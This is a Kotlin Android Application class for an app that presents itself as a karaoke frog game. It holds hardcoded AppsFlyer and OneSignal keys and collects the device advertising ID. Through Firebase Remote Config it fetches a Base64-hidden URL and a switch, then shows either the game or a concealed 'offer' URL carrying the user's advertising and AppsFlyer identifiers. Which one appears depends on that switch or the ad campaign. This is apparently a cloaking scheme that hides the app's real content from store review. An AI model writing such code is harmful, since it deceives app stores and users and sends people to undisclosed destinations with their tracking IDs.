package com.clement.karaokefrog.app

import android.app.Application
import android.util.Log

import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.facebook.FacebookSdk
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.onesignal.OneSignal
import com.clement.karaokefrog.black.advertising_ID
import com.clement.karaokefrog.black.doneUrl
import com.clement.karaokefrog.black.mainUrl
import com.clement.karaokefrog.parseSubs
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch


class myApp : Application() {

    companion object {
        var toGame = {}
        var toOffer = {}
    }

    override fun onCreate() {
        super.onCreate()
        initFacebook()
        setAdvenchedId()
        initAppsFlyer()
        firebaseRemote()
        oneSignal()
    }

    private fun oneSignal(){
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId("b62d5215-3c31-4f04-af0f-1caf2ada1d1b")
        OneSignal.promptForPushNotifications()
    }

    fun initAppsFlyer() {
        val token = "rpaZQL27fJhjw4YbhmJVy8"

        AppsFlyerLib.getInstance().init(token, AppsFlayerListner, applicationContext)
        AppsFlyerLib.getInstance().start(applicationContext, token, object :
            AppsFlyerRequestListener {
            override fun onSuccess() {
                Log.d("appsFlayer", "Launch sent successfully")
            }

            override fun onError(errorCode: Int, errorDesc: String) {
                Log.d(
                    "appsFlayer", "Launch failed to be sent:\n" +
                            "Error code: " + errorCode + "\n"
                            + "Error description: " + errorDesc
                )
            }
        })


    }

    private fun firebaseRemote() {
        val fireBaseLinc = FirebaseRemoteConfig.getInstance()
        fireBaseLinc.fetchAndActivate()
            .addOnCompleteListener { reqest ->
                if (reqest.isSuccessful) {
                    val getFBurl = FirebaseRemoteConfig.getInstance().getString("url")
                    val fireBaseState: Boolean = FirebaseRemoteConfig.getInstance().getBoolean("state")

                    Log.d("fireBase", getFBurl)
                    if (getFBurl.isNotBlank()) {
                        try {

                            mainUrl = android.util.Base64.decode(getFBurl, android.util.Base64.DEFAULT).decodeToString()

                            if (AppsFlayerListner.isCompleted) {
                                logic(fireBaseState)
                            } else {
                                AppsFlayerListner.isCompletedListener = {
                                    logic(fireBaseState)
                                }
                            }

                            return@addOnCompleteListener

                        } catch (_: Exception) {

                        }
                    }

                }

                toGame()
            }
    }

    fun logic(fireBaseState: Boolean) {
        val appsFlyerID = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
        if (!fireBaseState) {
            if (AppsFlayerListner.campaign?.startsWith("app//") != true) {
                toGame()
                return
            }
        }

        val subs = parseSubs(AppsFlayerListner.campaign) +
                mapOf("sub9" to appsFlyerID, "sub10" to advertising_ID)

        val removeKey = if (mainUrl.contains("?key=")) {
            mainUrl.take(mainUrl.indexOf('?') + 1)
        } else {
            mainUrl
        }
        doneUrl = removeKey + subs.map { it.key + "=" + it.value }.joinToString(separator = "&")
        toOffer()
    }

    fun initFacebook(){

        FacebookSdk.fullyInitialize()
    }

   fun setAdvenchedId(){
        CoroutineScope(Dispatchers.IO).launch {
            try {
                advertising_ID = AdvertisingIdClient.getAdvertisingIdInfo(this@myApp).id!!
            } catch (_: Exception) {
            }
        }
    }
}

